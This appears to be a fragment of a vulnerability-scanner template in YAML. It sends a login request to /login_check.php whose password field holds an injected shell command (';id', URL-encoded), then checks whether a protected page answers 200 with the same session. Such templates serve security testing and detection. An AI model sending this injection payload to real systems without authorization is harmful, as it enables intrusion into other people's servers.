http:
- method: POST
  path:
  - /login_check.php
  body: userName={{tmp_username}}&password=%3Bid&x=0&y=0
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: PHPSESSID={{tmp_cookie}}
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 302
- method: GET
  path:
  - /acc/Header.php
  headers:
    Cookie: PHPSESSID={{tmp_cookie}}
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
